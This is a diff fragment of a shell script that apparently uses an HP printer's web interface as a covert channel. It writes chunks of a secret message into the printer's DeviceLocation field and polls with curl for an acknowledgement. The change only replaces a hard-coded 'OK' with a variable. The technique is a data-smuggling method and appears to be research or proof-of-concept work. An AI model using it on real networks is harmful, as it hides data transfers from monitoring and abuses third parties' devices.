@@ -19,9 +19,9 @@ echo "Sending chunks of the secret msg ..."
 for SECRET_MSG in `echo $INPUT_SECRET_MSG | fold -w64`; do
 	#echo "Next chunk='"$SECRET_MSG"'."
 	RECV_MSG="notset"
-	#echo "Waiting for CR's \"OK\" msg ..."
+	#echo "Waiting for CR's "$ACK_MESSAGE" msg ..."
 	COUNTER=0
-	while [ ! "$RECV_MSG" == "OK" ]; do
+	while [ ! "$RECV_MSG" == "$ACK_MESSAGE" ]; do
 		RECV_MSG=`curl --insecure 'https://'$PRINTER_IP'/hp/device/info_config_AirPrint.html?tab=Networking&amp;menu=AirPrintStatus' 2>&1 | grep DeviceLocation\" | sed 's/.*VALUE=\"//' | sed 's/\".*//g'`
 		#echo "RECV_MSG=$RECV_MSG"
 		echo -n "#"
@@ -30,7 +30,7 @@ for SECRET_MSG in `echo $INPUT_SECRET_MSG | fold -w64`; do
 			# get out of a race condition, just post this thing again
 			post_message $PRINTER_IP "unused" $SECRET_MSG
 		fi
-	done; echo -n "K" #echo " received 'OK'. Sending secret msg chunk."
+	done; echo -n "K" #echo " received "$ACK_MESSAGE". Sending secret msg chunk."
 
 	# parameters: printer-ip  csrf  secret_msg
 	post_message $PRINTER_IP "unused" $SECRET_MSG
